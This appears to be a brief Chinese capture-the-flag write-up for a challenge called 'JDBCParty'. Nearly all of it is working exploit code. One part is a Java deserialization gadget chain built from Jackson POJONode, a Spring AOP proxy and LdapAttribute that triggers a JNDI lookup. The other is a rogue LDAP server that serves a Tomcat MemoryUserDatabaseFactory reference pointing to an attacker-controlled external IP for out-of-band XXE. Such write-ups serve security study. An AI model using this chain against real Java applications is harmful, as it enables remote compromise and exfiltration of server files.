# JDBCParty

getter到jndi，把题目变为了高版本jndi绕过，利用`MemoryUserDatabaseFactory`

poc

```java
import com.fasterxml.jackson.databind.node.POJONode;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtMethod;  
import javassist.LoaderClassPath;  
import org.springframework.aop.framework.AdvisedSupport;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import sun.misc.Unsafe;  
import javax.naming.CompositeName;  
import javax.naming.directory.Attribute;  
import javax.swing.event.EventListenerList;  
import javax.swing.undo.UndoManager;  
import java.io.ByteArrayOutputStream;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.Method;  
import java.util.Base64;  
import java.util.Vector;  
  
public class test {  
    public static void main(String[] args) throws Exception {  
        Field field = Unsafe.class.getDeclaredField("theUnsafe");  
        field.setAccessible(true);  
        Unsafe unsafe = (Unsafe) field.get((Object) null);  
        Module baseModule=Object.class.getModule();  
        Class<?> currentClass= test.class;  
        long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));  
        unsafe.getAndSetObject(currentClass,addr,baseModule);  
  
  
        ClassPool.getDefault().insertClassPath(new LoaderClassPath(test.class.getClassLoader()));  
        CtClass ctClass = ClassPool.getDefault().getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");  
        // 获取原方法  
        CtMethod originalMethod = ctClass.getDeclaredMethod("writeReplace");  
        // 修改方法名  
        originalMethod.setName("Replace");  
        // 4. 获取修改后的字节码  
        byte[] classBytes = ctClass.toBytecode();  
        ctClass.detach();  
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);  
        defineClass.setAccessible(true);  
        ClassLoader classLoader =test.class.getClassLoader();  
        Class<?> modifiedClass = (Class<?>) defineClass.invoke(  
                classLoader, "com.fasterxml.jackson.databind.node.BaseJsonNode",  
                classBytes, 0, classBytes.length);  
  
        Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");  
        Constructor<?> constructor = clazz.getDeclaredConstructor(String.class);  
        constructor.setAccessible(true);  
        Object obj = constructor.newInstance("name");  
  
        ReflectUtil.setFieldValue(obj, "baseCtxURL", "ldap://localhost:9999");  
        ReflectUtil.setFieldValue(obj, "rdn", new CompositeName("a/b"));  
  
        Class<?> clazz1 = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");  
        Constructor<?> cons = clazz1.getDeclaredConstructor(AdvisedSupport.class);  
        cons.setAccessible(true);  
        AdvisedSupport advisedSupport = new AdvisedSupport();  
        advisedSupport.setTarget(obj);  
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);  
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Attribute.class}, handler);  
        POJONode jsonNodes = new POJONode(proxyObj);  
  
  
        EventListenerList list2 = new EventListenerList();  
        UndoManager manager = new UndoManager();  
        Vector vector = (Vector) getFieldValue(manager, "edits");  
        vector.add(jsonNodes);  
        unsafe.putObject(list2, unsafe.objectFieldOffset(list2.getClass().getDeclaredField("listenerList")), new Object[]{InternalError.class, manager});  
  
        ByteArrayOutputStream bao = new ByteArrayOutputStream();  
        new ObjectOutputStream(bao).writeObject(list2);  
        System.out.println(Base64.getEncoder().encodeToString(bao.toByteArray()));  
    }  
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {  
        Field field = getField(obj.getClass(), fieldName);  
        return field.get(obj);  
    }  
    public static Field getField(Class<?> clazz, String fieldName) {  
        Field field = null;  
  
        try {  
            field = clazz.getDeclaredField(fieldName);  
            field.setAccessible(true);  
        } catch (NoSuchFieldException var4) {  
            if (clazz.getSuperclass() != null) {  
                field = getField(clazz.getSuperclass(), fieldName);  
            }  
        }  
  
        return field;  
    }  
}  
class ReflectUtil {  
  
    public static void setFieldValue(Object obj, String name, Object val) throws Exception {  
        setFieldValue(obj.getClass(), obj, name, val);  
    }  
    public static void setFieldValue(Class<?> clazz, Object obj, String name, Object val) throws Exception {  
        Field field = Unsafe.class.getDeclaredField("theUnsafe");  
        field.setAccessible(true);  
        Unsafe unsafe = (Unsafe) field.get((Object) null);  
        Module baseModule=Object.class.getModule();  
        Class<?> currentClass= ReflectUtil.class;  
        long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));  
        unsafe.getAndSetObject(currentClass,addr,baseModule);  
        Field f = clazz.getDeclaredField(name);  
        f.setAccessible(true);  
        f.set(obj, val);  
    }  
  
}
```

ldap服务，

```java
package org.example;  
  
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
import org.apache.naming.ResourceRef;  
  
import javax.naming.Reference;  
import javax.naming.StringRefAddr;  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.io.ByteArrayOutputStream;  
import java.io.IOException;  
import java.io.ObjectOutputStream;  
import java.net.InetAddress;  
import java.util.ArrayList;  
import java.util.List;  
  
public class LDAP_BS2 {  
    private static final String LDAP_BASE = "dc=example,dc=com";  
  
    public static void main(String[] args) {  
  
        int port = 1389;  
  
        try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
            config.setListenerConfigs(new InMemoryListenerConfig(  
                    "listen",  
                    InetAddress.getByName("0.0.0.0"),  
                    port,  
                    ServerSocketFactory.getDefault(),  
                    SocketFactory.getDefault(),  
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
            config.addInMemoryOperationInterceptor(new OperationInterceptor());  
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
            System.out.println("Listening on 0.0.0.0:" + port);  
            ds.startListening();  
        }  
        catch (Exception e) {  
            e.printStackTrace();  
        }  
    }  
    public static byte[] serialize(Object obj) throws IOException {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
        oos.writeObject(obj);  
        return baos.toByteArray();  
    }  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
  
        @Override  
        public void processSearchResult(InMemoryInterceptedSearchResult result) {  
            String base = result.getRequest().getBaseDN();  
            Entry e = new Entry(base);  
  
            e.addAttribute("javaClassName", "foo");  
            try {  
  
  
                ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",  
                        true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);  
  
                ref.add(new StringRefAddr("pathname", "http://47.109.156.81:4567/test.xml"));  
  
                e.addAttribute("javaSerializedData", serialize(ref));  
  
                result.sendSearchEntry(e);  
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
            } catch (Exception exception) {  
                exception.printStackTrace();  
            }  
        }  
    }  
}
```

打oob xxe